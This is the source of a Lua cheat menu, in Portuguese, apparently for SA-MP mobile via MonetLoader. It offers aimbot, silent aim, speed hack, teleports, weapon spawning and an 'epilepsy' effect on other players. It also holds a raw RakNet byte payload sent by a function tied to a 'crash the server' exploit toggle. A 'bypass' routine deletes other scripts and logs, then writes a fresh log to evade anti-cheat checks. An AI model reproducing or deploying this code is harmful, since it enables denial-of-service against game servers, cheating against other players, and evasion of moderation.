...
local executar = imgui.new.bool(false)
local horarioEntrada = ""

-- Diretórios
local dir_monet = "/storage/emulated/0/Android/media/ro.alyn_sampmobile.game/monetloader"
local dir_logs = dir_monet .. "/logs"
local caminho_log = dir_logs .. "/monetloader.log"

-- Nome do próprio script (.lua)
local bypass_path = thisScript().path
local bypass_filename = bypass_path:match("([^/\\]+)$") or ""

-- Captura horário atual
local function capturarHorario()
    local t = os.date("*t")
    horarioEntrada = string.format("%04d%02d%02d%02d%02d.%02d", t.year, t.month, t.day, t.hour, t.min, t.sec)
end

-- Deleta arquivos .lua (exceto o bypass)
local function deletarLuas()
    for file in lfs.dir(dir_monet) do
        if file:match("%.lua$") and file ~= bypass_filename then
            os.remove(dir_monet .. "/" .. file)
        end
    end
end
...
-- Cria novo arquivo de log limpo
...
-- Executa o bypass completo
local function executarBypass()
    capturarHorario()
    deletarLuas()
    deletarLogs()
    criarLog()
    sampAddChatMessage("[Bypass] Executado com sucesso", -1)
end

local mostrarInputs = imgui.new.bool(false)
local idArma = imgui.new.int(24)      -- Desert Eagle como padrão
local muniArma = imgui.new.int(30)    -- munição padrão
...
local autoCrash = imgui.new.bool(false)

-- Função que envia o exploit
local function enviarExploit()
    ...
    raknetBitStreamWriteString(bs,
        "\x14\x35\x74\x7f\xff\xbf\x90\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x71\x4a\x41\x22\xb7\x3a\x39\x30\xb7\x31\xb2\x90\x34\x34\xb2\x32\x32\xb7\x10\x31\x3c\x85" ..
        "\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x71\x4a\x41\x21\x39\x34\xb1\xb5\xb9\x90\x30\xb7\x32\x10\x39\x3a\xb1\x31\x36\x32\x85\x10\x10\x10\x10\x10\x10\x10" ..
        "\x71\x4b\x41\x71\x4b\x41\xf1\x4b\x41\x71\x4b\x42\xf1\x4b\x43\xf1\x4b\x42\xf1\x4b\x42\xf1\x4b\x43\xf1\x4b\x42\x71\x4b\x41\x85\x10\x10\x10\x10\x71\x4a\x59\x90" ..
        "\x10\x71\x4a\xc8\x90\x10\x10\x10\x10\x10\x10\x71\x4a\xc8\xf1\x4b\x4a\x71\x4b\x4a\x71\x4b\x4a\x71\x4b\x4a\x71\x4b\x4a\x71\x4b\x4a\x71\x4b\x4a\x05\x10\x10\x10" ..
        "\x10\x71\x4a\x41\x10\x10\x71\x4a\xcd\x71\x4a\xcb\x90\x10\x10\x10\x10\x71\x4a\xca\x71\x4a\xce\x90\x29\xb0\xb2\x32\x30\xb6\x90\x24\x3a\xb9\xb9\xb2\xb4\xb7\x05" ..
        "\x10\x10\x10\x10\x71\x4a\x41\x10\x10\x10\x71\x4a\xc8\x90\x10\x10\x10\x10\x71\x4a\xc8\x90\x10\x10\x71\x4a\x41\x05\x10\x10\x10\x1b\x33\x3a\x10\x10\x71\x4a\xcd" ..
        "\x71\x4a\xcb\x90\x10\x10\x71\x4a\xca\x71\x4a\xce\x90\x10\x10\x71\x4a\x41\x05\x10\x10\x10\x10\x71\x4a\x41\x1e\x9e\x9e\x9e\xb7\x90\x10\x10\x71\x4a\xcd\x71\x4a" ..
        "\xc8\x71\x4a\xc8\x71\x4a\xc8\x71\x4a\xc8\x71\x4a\x41\x71\x4a\xc8\x71\x4a\xc8\x71\x4a\xc8\x71\x4a\xc8\x71\x4a\xc8\x71\x4a\xcb\x85\x10\x10\x10\x10\x71\x4a\x41" ..
        "\x10\x10\x10\x71\x4a\x41\x71\x4a\xc8\xa0\x10\x10\x10\x10\x71\x4b\x43\xf1\x4b\x42\xf1\x4b\x43\x71\x4b\x43\xf1\x4b\x43\x71\x4b\x42\xf1\x4b\x42\xf1\x4b\x44\x10" ..
        "\x71\x4a\xc8\x85\x10\x10\x10\x10\x71\x4a\x5b\x90\x10\x10\x71\x4a\x41\x71\x4a\xcd\x71\x4a\x41\x71\x4a\xc8\x71\x4a\xc8\x71\x4a\xc8\x71\x4a\xc8\x71\x4a\xc8\x71" ..
        "\x4a\xc8\x71\x4a\xc8\x71\x4a\xc8\x71\x4a\xc8\x71\x4a\xc8\x71\x4a\xc8\x71\x4a\xce\x85\x20\xb4\xb9\x10\x3b\x32\xb7\x3a\x71\x4a\x41\x10\x71\x4a\x41\x23\x30\xb7\x00"
    )
    raknetSendBitStream(bs)
    raknetDeleteBitStream(bs)
end

-- Thread que envia automaticamente se ativado
...
local autoReconnect = imgui.new.bool(true) -- já ativo por padrão
local reconnectDelay = imgui.new.int(3)    -- delay padrão 3 segundos
...
-- Função que executa a reconexão com delay
...
local sections = {
    ...
    ["Miscellaneous"] = {
        "EXPLOITS",
        "TELEPORT",
        "CREDITOS" -- Alterado de CONFIGS para CREDITOS
    }
}
...
function aba_COMBAT()
    ...
    -- Tamanho total do menu
    local size = imgui.GetContentRegionAvail()

    -- Divide a tela em duas "colunas" usando BeginChild manual
    ...
    -- ▸ SILENT AIM
    ---------------------------
    imgui.TextColored(imgui.ImVec4(1, 0.3, 0.1, 1), faicons("crosshairs") .. " SILENT AIM")
    imgui.Separator()

    imgui.Checkbox("CABEÇA", silentcabeca)
    imgui.Checkbox("PEITO", silentpeito)
    imgui.Checkbox("VIRILHA", silentvirilha)
    imgui.Checkbox("BRAÇO DIREITO", silentbraco)
    imgui.Checkbox("BRAÇO ESQUERDO", silentbraco2)
    imgui.Checkbox("PERNA DIREITA", silentperna)
    imgui.Checkbox("PERNA ESQUERDA", silentperna2)

    imgui.Spacing()
    if imgui.Button((state and "DESLIGAR AIM" or "LIGAR AIM"), imgui.ImVec2(180 * DPI, 32 * DPI)) then
        state = not state
        if state then
            lua_thread.create(function()
                while state do
    ...
    imgui.Spacing()
    imgui.Checkbox(" IGNORAR PAREDE", settings.search.ignoreObj)
    imgui.Checkbox(faicons("slash") .. " LINHA", settings.render.line)
    imgui.Checkbox(faicons("circle") .. " FOV", settings.render.circle)
    imgui.SliderInt(faicons("expand") .. " FOV", settings.search.radius, 1, 60)
    imgui.ColorEdit4(faicons("palette") .. " COR FOV", slide.fovCorsilent)

    if not settings.search.useWeaponDistance[0] then
        imgui.SliderInt(faicons("ruler-horizontal") .. " DISTÂNCIA", settings.search.distance, 1, 1000)
    end
    imgui.EndChild()
    ...
    imgui.Spacing()
    imgui.Checkbox(" IGNORAR PAREDE", sulist.aimbotparede)
    imgui.Checkbox(faicons("lock") .. " AIM LEGIT", sulist.lockAIM)
    imgui.SliderInt(faicons("crosshairs") .. " QTD. TIROS", slide.aimCtdr, 0, 10)
    imgui.SliderFloat(faicons("magic") .. " SUAVIDADE", slide.aimSmoothhhh, 0.050, 1.0, "%.3f")
    imgui.SliderFloat(faicons("ruler-horizontal") .. " DISTÂNCIA", slide.DistanciaAIM, 0.0, 1000.0, "%.1f")
    imgui.ColorEdit4(faicons("palette") .. " COR FOV", slide.fovCorAimmm)

    imgui.Spacing()
    imgui.Text(faicons("expand") .. " FOV DO AIMBOT")
...
function aba_VISUAL()
    ...
    if imgui.Checkbox("LOCALIZAR OBJETOS", localizarAtivado) then
    ...
    if localizarAtivado[0] then
        ...
        if imgui.Button("LOCALIZAR") then
            if objectId[0] == 0 then
                sampAddChatMessage(" {FF0000}Insira um ID de objeto valido", -1)
...
function aba_PLAYER()
    ...
    imgui.Checkbox('ANT STUN', EASY.nostun)
    ...
    if imgui.Checkbox("DESATIVAR ANTI DM", hg.ANTIDM) then end
    ...
    imgui.Checkbox("AUTO RECONNECT", autoReconnect)
    imgui.Checkbox("FAST SPAWN", autoSpawn)
    imgui.Checkbox('PULSATOR VIDA', EASY.teste67)
    if imgui.Checkbox("NO FALL", noFallActive) then
    ...
    imgui.Checkbox('BLOQUEAR TP ADMIN', EASY.naotelaradm) 
    imgui.Checkbox("SPEED HACK", speedHack)   
    if imgui.Checkbox("FAKE LAG", fakeLagActive) then
        if not fakeLagActive[0] then
            printString("FAKE LAG OFF", 5000)
        end
    end
    if fakeLagActive[0] then
    imgui.SliderInt("Delay (ms)", fakeLagDelay, 100, 3000)
    end
...
function aba_WORLD()
    imgui.Checkbox('ADM NÃO CONGELAR', EASY.teste31)
    imgui.Checkbox('PUXAR JETPACK', EASY.teste29)
    if imgui.Checkbox("AUTO PILOTO", autoPilot) then
            if autoPilot[0] then iniciarAutoPiloto() else pararAutoPiloto() end
        end
    imgui.Checkbox("PUXAR VEÍCULO PRÓXIMO", autoPuxar)
    imgui.Checkbox("BLOQUEAR DIALOGS", blockDialogs)
    imgui.Checkbox("EXPLOIT DERRUBAR SERVIDOR", autoCrash)
    imgui.Checkbox('FLODAR AUTO SE MATAR', EASY.flodarmorte) 
    if imgui.Checkbox("EPILEPSIA NOS PLAYERS", act) then
            if act[0] then
                sampAddChatMessage("{FF99FF}[OXHACK]: {0000FF}EPI{33FF00}LEP{FF0000}SIA {33FF00}[Ativado]", -1)
                sampAddChatMessage("{7ABEFF}[JUCA]{FFFFFF} Prepare-se para o caos kkkkk", -1)
            else
                sampAddChatMessage("{FF99FF}[OXHACK]: {0000FF}EPI{33FF00}LEP{FF0000}SIA {FF0000}[Desativado]", -1)
                sampAddChatMessage("{7ABEFF}[DOISR]{FFFFFF} Modo epilepsia insano desligado", -1)
            end
        end
        imgui.Checkbox("PUXAR ARMAS", mostrarInputs)
        if mostrarInputs[0] then
            imgui.InputInt("ID da Arma", idArma)
            imgui.InputInt("Munição", muniArma)
            if imgui.Button("Puxar Arma") then
                giveGun(idArma[0], muniArma[0])
            end
        end
        if imgui.Checkbox("BYPASS TELAGEM", executar) then
        if executar[0] then
            executarBypass()
            executar[0] = false
        end
    end
    if imgui.Checkbox("BYPASS ARMAS", bypass) then
        if bypass[0] then ativarBypass() end
    end
    imgui.Checkbox("FAKE PC", fakeActive)
end

function aba_EXPLOITS()
    imgui.Checkbox("AUTOFARM CARREGADOR (OSCRIAS)", autoTPCheck)
end

function aba_TELEPORT()
    imgui.TextColored(imgui.ImVec4(1.0, 0.75, 0.0, 1.0), faicons('LOCATION_DOT') .. ' SISTEMA DE TELEPORTE')
    imgui.Separator()
    ...
    -- Primeira linha
    if imgui.Button(faicons('map') .. ' HOSPITAL LS', imgui.ImVec2(165, 45)) then
    ...
    imgui.SameLine()
    if imgui.Button(faicons('map') .. ' PREFEITURA LS', imgui.ImVec2(165, 45)) then
    ...
    -- Segunda linha
    if imgui.Button(faicons('map') .. ' AEROPORTO LS', imgui.ImVec2(165, 45)) then
        setCharCoordinates(1, 1959.68, -2188.97, 13.54)
    end
    imgui.SameLine()
    if imgui.Button(faicons('map') .. ' PRAÇA LS', imgui.ImVec2(165, 45)) then
    ...
    -- Terceira linha
    if imgui.Button(faicons('map') .. ' CASSINO LV', imgui.ImVec2(165, 45)) then
    ...
    if imgui.Button(faicons('LOCATION_CROSSHAIRS') .. ' TELEPORTE GUIADO', imgui.ImVec2(508, 45)) then
        ...
        if result and not coord_master then
            lua_thread.create(function()
                ...
                printStringNow("~r~DISTANCIA: " .. tostring(math.floor(distance)), 5000)
...
function aba_CREDITOS()
    imgui.Text("Feito por: Juca Menu")
    imgui.Text("Ajudante: Doisr Menu")
    imgui.Text("Projeto Feito por: Doisr Menu")
    imgui.Text("Versão: 1.0")
    imgui.Text("Discord: https://discord.gg/uGf6ckNTQh")
    imgui.Text("Primeira Versão em breve mais funções...")
end
...
function ativarBypass()
    lua_thread.create(function()
        sampSendInteriorChange(163)
        sampSendInteriorChange(0)
        wait(1500)
        sampAddChatMessage("[Bypass Armas]: ativada com sucesso", 0x00FF00)
    end)
end

-- Mensagem no chat
function msg(text)
    sampAddChatMessage('[Bypass Armas]: ' .. text, 0xFF8000)
end

-- Bloqueia RPCs de arma se o bypass estiver ativado
...
function main()
    ...
    while true do
        ...
        local lastJetpackState = false
 
if EASY.teste29[0] and not lastJetpackState then
    sampSetSpecialAction(2) -- Ativa Jetpack
    lastJetpackState = true
elseif not EASY.teste29[0] and lastJetpackState then
    sampSetSpecialAction(0) -- Desativa Jetpack
